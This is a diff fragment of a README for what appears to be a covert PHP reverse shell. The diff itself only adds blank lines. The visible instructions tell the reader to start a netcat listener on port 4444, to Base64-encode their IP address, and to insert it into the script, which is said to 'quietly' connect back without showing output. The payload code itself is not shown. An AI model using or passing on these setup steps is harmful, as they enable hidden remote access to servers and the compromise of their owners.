@@ -25,6 +25,7 @@ It quietly connects back to your machine reliably without showing any output.
 nc -lvnp 4444
 ```
 **2. Encode your IP or hostname in Base64**
+
 Use this simple command:
 
 ```bash
@@ -37,6 +38,7 @@ echo "192.168.1.5" | base64
 Copy the output and replace the $ip_b64 value in the PHP script.
 
 **3. Update the PHP script**  
+
 Change these lines with your Base64 encoded IP/hostname and port:
 
 ```php
